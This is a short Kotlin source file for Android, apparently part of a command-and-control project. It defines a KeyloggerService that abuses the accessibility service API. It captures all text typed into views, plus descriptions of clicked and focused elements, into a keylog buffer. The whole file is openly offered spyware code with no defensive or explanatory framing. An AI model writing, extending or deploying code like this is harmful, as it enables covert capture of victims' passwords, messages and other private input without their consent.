package com.outcome.c2

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent

class KeyloggerService : AccessibilityService() {

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        if (!KeylogBuffer.isActive()) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                event.text.forEach { KeylogBuffer.append(it.toString()) }
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED,
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                event.contentDescription?.let { KeylogBuffer.append("[${it}]") }
            }
        }
    }

    override fun onInterrupt() {}
}
